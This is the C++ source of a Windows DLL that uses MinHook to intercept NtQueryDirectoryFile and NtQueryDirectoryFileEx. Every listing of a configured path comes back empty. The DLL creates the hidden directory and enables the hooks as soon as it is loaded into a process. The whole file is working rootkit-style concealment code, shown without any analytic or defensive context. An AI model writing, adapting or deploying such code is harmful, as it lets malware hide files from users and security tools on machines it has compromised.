// MeuHookDLL.cpp
#include "pch.h"
#include <Windows.h>
#include <winternl.h>
#include <ntstatus.h>
#include "MinHook.h"
#include "config.hpp"

#pragma comment(lib, "libMinHook.x64.lib")

typedef NTSTATUS(NTAPI* typedefNtQueryDirectoryFile)(
    HANDLE FileHandle,
    HANDLE Event,
    PIO_APC_ROUTINE ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    BOOLEAN ReturnSingleEntry,
    PUNICODE_STRING FileName,
    BOOLEAN RestartScan
    );

typedef NTSTATUS(NTAPI* typedefNtQueryDirectoryFileEx)(
    HANDLE FileHandle,
    HANDLE Event,
    PIO_APC_ROUTINE ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    ULONG QueryFlags,
    PUNICODE_STRING FileName
    );

static typedefNtQueryDirectoryFile originalNtQueryDirectoryFile;
static typedefNtQueryDirectoryFileEx originalNtQueryDirectoryFileEx;

static NTSTATUS NTAPI HookedNtQueryDirectoryFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan) {
    NTSTATUS status = STATUS_NO_MORE_FILES;
    WCHAR dirPath[MAX_PATH + 1] = { 0 };

    if (GetFinalPathNameByHandleW(FileHandle, dirPath, MAX_PATH, FILE_NAME_NORMALIZED)) {
        if (wcsstr(dirPath, PathHide)) {
            RtlZeroMemory(FileInformation, Length);
        }
        else {
            status = originalNtQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
        }
    }

    return status;
}

static NTSTATUS NTAPI HookedNtQueryDirectoryFileEx(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, ULONG QueryFlags, PUNICODE_STRING FileName) {
    NTSTATUS status = STATUS_NO_MORE_FILES;
    WCHAR dirPath[MAX_PATH + 1] = { 0 };

    if (GetFinalPathNameByHandleW(FileHandle, dirPath, MAX_PATH, FILE_NAME_NORMALIZED)) {
        if (wcsstr(dirPath, PathHide)) {
            RtlZeroMemory(FileInformation, Length);
        }
        else {
            status = originalNtQueryDirectoryFileEx(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, QueryFlags, FileName);
        }
    }

    return status;
}

BOOL StartHook() {
    if (MH_Initialize() != MH_OK) {
        return FALSE;
    }

    HMODULE ntdllHandle = GetModuleHandleA("ntdll.dll");
    originalNtQueryDirectoryFile = (typedefNtQueryDirectoryFile)GetProcAddress(ntdllHandle, "NtQueryDirectoryFile");
    originalNtQueryDirectoryFileEx = (typedefNtQueryDirectoryFileEx)GetProcAddress(ntdllHandle, "NtQueryDirectoryFileEx");

    if (MH_CreateHook(&(PVOID&)originalNtQueryDirectoryFile, HookedNtQueryDirectoryFile, NULL) != MH_OK) {
        return FALSE;
    }

    if (MH_CreateHook(&(PVOID&)originalNtQueryDirectoryFileEx, HookedNtQueryDirectoryFileEx, NULL) != MH_OK) {
        return FALSE;
    }

    if (MH_EnableHook(MH_ALL_HOOKS) != MH_OK) {
        return FALSE;
    }

    return TRUE;
}

bool CreateDirectoryIfNotExists()
{
    if (CreateDirectory(PathHide, nullptr) || GetLastError() == ERROR_ALREADY_EXISTS)
    {
        return true;
    }
    else
    {
        return false;
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        CreateDirectoryIfNotExists();
        StartHook();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
